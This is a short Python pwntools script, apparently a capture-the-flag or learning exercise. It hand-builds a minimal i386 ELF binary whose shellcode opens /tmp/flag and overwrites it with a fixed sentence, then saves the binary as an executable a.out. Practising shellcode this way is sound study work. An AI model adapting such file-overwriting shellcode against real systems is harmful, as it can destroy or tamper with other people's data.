#!python

# code from below. Thanks
# http://daehee87.tistory.com/327
# http://www.muppetlabs.com/~breadbox/software/tiny/teensy.html

import os
from pwn import *
context('i386', 'linux', 'ipv4')

OUTPUT = 'a.out'
HEAD  = ''
HEAD += "\x7f\x45\x4c\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x03\x00\x01\x00\x00"
HEAD += "\x00\x54\x80\x04\x08\x34\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x34\x00\x20\x00\x01\x00"
HEAD += "\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x04\x08\x00\x80\x04\x08"
TAIL  = "\x05\x00\x00\x00\x00\x10\x00\x00"

contents = 'This is my first time to write a overwrite shellcode in i386\n'
sc = asm(shellcode.open_file('/tmp/flag', flags=0x2))
sc += asm(shellcode.write_file(in_fd=4, contents=contents, size=len(contents)))

payload = HEAD
payload += p32(len(sc)) * 2
payload += TAIL
payload += sc

open(OUTPUT, 'wb').write(payload)
if os.path.exists(OUTPUT) == True:
    os.chmod(OUTPUT, 0755)
